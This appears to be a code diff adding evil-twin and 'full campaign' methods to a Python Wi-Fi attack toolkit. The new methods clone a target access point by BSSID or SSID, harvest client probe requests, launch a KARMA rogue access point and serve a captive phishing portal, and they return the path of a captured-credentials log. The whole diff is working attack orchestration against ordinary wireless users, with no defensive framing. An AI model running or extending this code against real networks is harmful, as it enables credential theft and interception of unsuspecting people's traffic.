@@ -579,3 +579,97 @@ address=/#/10.0.0.1
         )
 
         return {"status": "stopped"}
+
+    # ── Evil Twin ────────────────────────────────────────────────
+
+    def start_evil_twin(
+        self,
+        interface: str,
+        bssid: str = "",
+        ssid: str = "",
+        channel: int = 6,
+        portal: str = "wifi_login",
+        internet_iface: str = "eth0",
+    ) -> dict:
+        """Clone a specific AP (by BSSID/SSID) and launch a captive portal.
+
+        If *ssid* is empty, it falls back to a generic 'FreeWiFi' AP.
+        This is a targeted variant of start_evil_portal.
+        """
+        target_ssid = ssid or "FreeWiFi"
+        target_channel = channel or 6
+
+        # If we have a BSSID, try to read the SSID from the ARP cache / scan
+        if bssid and not ssid:
+            r = self.layer.run(
+                f"iw dev {interface} scan 2>/dev/null | grep -A1 {bssid}",
+                timeout=10,
+            )
+            for line in r.stdout.splitlines():
+                if "SSID:" in line:
+                    target_ssid = line.split("SSID:", 1)[1].strip()
+                    break
+
+        result = self.start_evil_portal(
+            interface,
+            ssid=target_ssid,
+            channel=target_channel,
+            portal=portal,
+            internet_iface=internet_iface,
+        )
+        result["bssid_cloned"] = bssid
+        return result
+
+    def start_full_campaign(
+        self,
+        interface: str,
+        channel: int = 6,
+        portal: str = "wifi_login",
+        internet_iface: str = "eth0",
+        probe_duration: int = 30,
+    ) -> dict:
+        """Full Pineapple campaign: probe harvest → KARMA AP → captive portal.
+
+        Steps:
+          1. Harvest probe requests from nearby clients (30s)
+          2. Launch KARMA mode (respond to all probes)
+          3. Serve captive portal
+          4. Return live status snapshot
+        """
+        import time
+
+        log: list[str] = []
+
+        # Step 1: Harvest probes
+        log.append(f"[1/3] Harvesting probe requests on {interface} ({probe_duration}s)...")
+        probes = self.harvest_probes(interface, duration=probe_duration)
+        ssids_seen = [p.get("ssid", "") for p in probes.get("probes", []) if p.get("ssid")]
+        log.append(f"  Probes captured: {len(ssids_seen)} unique SSIDs")
+
+        # Step 2: KARMA attack
+        log.append("[2/3] Launching KARMA attack...")
+        karma = self.start_karma(interface, channel=channel, internet_iface=internet_iface)
+        log.append(f"  KARMA status: {karma.get('status', 'unknown')}")
+        time.sleep(3)
+
+        # Step 3: Captive portal
+        log.append("[3/3] Launching captive portal...")
+        # Use most-probed SSID if available
+        ssid = ssids_seen[0] if ssids_seen else "FreeWiFi"
+        portal_result = self.start_evil_portal(
+            interface,
+            ssid=ssid,
+            channel=channel,
+            portal=portal,
+            internet_iface=internet_iface,
+        )
+        log.append(f"  Portal active — SSID: {ssid}, Gateway: {portal_result.get('gateway')}")
+
+        return {
+            "status": "active",
+            "log": log,
+            "ssid": ssid,
+            "probes_seen": len(ssids_seen),
+            "creds_log": str(CREDS_LOG),
+            "portal": portal_result,
+        }
